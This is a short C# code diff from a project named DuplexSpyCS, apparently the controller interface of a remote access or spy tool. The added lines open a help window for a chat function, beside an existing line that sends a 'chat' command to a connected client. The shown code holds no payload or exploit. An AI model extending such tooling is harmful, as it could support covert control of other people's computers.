@@ -88,5 +88,10 @@ namespace DuplexSpyCS
         {
             v.fnSendCommand("chat|n"); //NORMAL
         }
+
+        private void toolStripButton4_Click(object sender, EventArgs e)
+        {
+            new frmBoxHelper("Function\\Chat").Show();
+        }
     }
 }
